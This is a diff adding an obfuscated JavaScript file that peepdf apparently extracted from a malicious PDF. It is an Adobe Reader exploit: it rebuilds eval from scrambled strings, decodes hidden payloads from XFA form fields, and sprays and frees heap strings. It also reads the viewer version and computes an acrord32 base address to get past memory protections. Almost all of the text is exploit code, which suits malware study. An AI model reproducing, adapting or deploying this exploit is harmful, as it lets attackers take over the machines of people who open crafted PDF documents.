@@ -1,0 +1,207 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+var kjRrq = "";
+var JOr = "";
+
+
+
+
+var FLKBA = "";
+
+
+function hxJ(zzz, sss, sdsds) {
+
+    switch (zzz) {
+    case 1:
+        return k6R(sss);
+        break;
+    case 2:
+        return TqlgJ(sss, sdsds);
+        break;
+    case 3:
+        return ghd(sss);
+        break;
+    case 4:
+        return Bp(sss);
+        break;
+    case 5:
+        return rJ2(sss);
+        break;
+    }
+
+}
+
+function hBdK(x) {
+
+    return qs(x);
+}
+
+function n4O(n) {
+    var w = form2.Text10.name;
+    var s = [];
+
+    var m = JrI(GERz);
+    m = JrI(vEGq1);
+
+    var ar = JrI("[" + m + "]");
+    var tt = (w.length > 3) ? 1 : 2;
+
+
+    for (var i = 0; i < ar.length; i++) {
+        var a = ar[i];
+        var b = (tt == 1) ? 0x87 : 0x88;
+        var j = (a & ~b) | (~a & b);
+        if ((j >= 33) && (j <= 126)) {
+            s[i] = String.fromCharCode(33 + ((j + 14) % 94));
+        } else {
+            s[i] = String.fromCharCode(j);
+        }
+    }
+    return s.join('');
+}
+
+
+function a2c(a) {
+    ter = "";
+
+    for (var i in a)
+    ter += String.fromCharCode(a[i]);
+
+    return ter;
+}
+
+
+function jsdQ(a, b, c, d) {
+    var x = form2.Text10.name;
+    var y = this[a];
+
+    x = x + '3';
+
+    return y;
+}
+
+var g0qn = "5t5in55f5o55har5o5ee5a5u5es5a5e";
+var upd = "Srg.rmCCdvlncp";
+var upd0 = "";
+var ii = 0;
+
+
+for (var i = 0; i < g0qn.length; i++) {
+    if (g0qn[i] != "5") upd0 += g0qn[i];
+    else upd0 += upd[ii++];
+
+}
+
+
+var xyz1 = upd0.slice(19, 23);
+
+var JrI = jsdQ.call(xyz1, xyz1);
+var Jt2l = JrI(upd0.slice(23));
+
+var O3 = [0x33, 0x77, 0x6A, 0x75, 0x71, 0x66, 0x68, 0x6A];
+
+var z3 = [0x5C, 0x64, 0x5D, 0x2F, 0x67, 0x2C, 0x27, 0x27, 0x29];
+var z4 = [0x5D, 0x2F, 0x67, 0x2C, 0x27, 0x2C, 0x27, 0x29];
+
+var z1 = [0x28, 0x2F, 0x5B, 0x5E, 0x5C, 0x78, 0x30, 0x39];
+
+for (var q = 0; q < O3.length; q++)
+FLKBA += String.fromCharCode(O3[q] - 5);
+
+var z2 = [0x28, 0x2F, 0x5B, 0x5C, 0x78, 0x30, 0x39];
+
+
+var GERz = "n" + FLKBA + a2c(z1) + a2c(z3);
+var vEGq1 = "m" + FLKBA + a2c(z2) + a2c(z4);
+
+JrI(n4O(xfa.resolveNode("Text11").rawValue));
+
+
+
+var br4pk = 0x12e;
+var trS = 200;
+var y7S8 = 0;
+var uPe = new Array(trS);
+var gmpU4 = new Array(trS);
+var K9r4 = new Array(trS);
+var Bs = new Array(trS / 2);
+
+
+
+var i;
+var j;
+if (ur.y7S8 == 0) {
+    var q3EgB = "\u5858\u5858\u5678\u1234";
+    var ie0 = ur.br4pk / 2 - 1 - (q3EgB.length + 2 + 2);
+
+    for (i = 0; i < ur.trS; i += 1)
+    ur.uPe[i] = q3EgB + fFhW.hxJ(1, i) + fFhW.kjRrq.substring(0, ie0) + fFhW.hxJ(1, i) + "";
+
+    for (j = 0; j < 1000; j++)
+    for (i = ur.trS - 1; i > ur.trS / 4; i -= 10)
+    ur.uPe[i] = null;
+    ur.y7S8 = 1;
+}
+
+
+
+var i;
+var j;
+
+var k4k98 = -1;
+var aEd = 0;
+var FVml = app.viewerVersion.toFixed(3);
+var OFXR1 = FVml.split(".");
+var Vd0 = parseInt(OFXR1[0]);
+var ex = (OFXR1.length > 1) ? parseInt(OFXR1[1]) : 0;
+
+if (OFXR1.length > 1) {
+    ex = parseInt(OFXR1[1]);
+    if (OFXR1[1].length == 1) ex *= 100;
+} else ex = 0;
+
+var rb = "aNNNcNroNNrNdN3NNN2";
+var MmQ = fFhW.Jt2l(fFhW.JOr);
+var fmoi = MmQ[0] + fFhW.hxJ(1, (ex << 16) | Vd0) + MmQ.substring(3);
+var dCx = Vd0 >= 11 ? 16 : 14;
+
+for (i = 0; i < ur.trS; i += 1)
+if ((ur.uPe[i] != null) && (ur.uPe[i][0] != "\u5858")) {
+    k4k98 = i;
+    Gs3j = aEd = (fFhW.hxJ(2, ur.uPe[i], dCx) >> 16);
+    aEd = (Gs3j - fFhW.hBdK(rb.replace(/N/g, ""))) << 16;
+
+    break;
+}
+
+if (k4k98 == -1) {
+    event.target.closeDoc(true);
+}
+
+var sBH = "";
+var SRZ6x = 0x10101000;
+if (Vd0 < 11) {
+    for (i = 0; i < 7; i += 1)
+    sBH += fFhW.hxJ(1, 0x30303030 + 0x11111111);
+}
+
+sBH += fFhW.hxJ(1, SRZ6x);
+while (sBH.length < ur.br4pk / 2)
+sBH += fFhW.hxJ(1, 0x47474747 + 0x11111111);
+
+for (j = 0; j < 10000; j++)
+ur.uPe[k4k98 - 1] = ur.uPe[k4k98] = null;
+
+for (i = 0; i < ur.trS; i += 1) {
+    ID = "" + i;
+    ur.gmpU4[i] = sBH.substring(0, ur.br4pk / 2 - ID.length) + ID + "";
+}
+
+var rt = SRZ6x;
+var JA4 = "";
+
+
+
+
+fFhW.JrI(fFhW.n4O(xfa.resolveNode("Text12").rawValue));
+
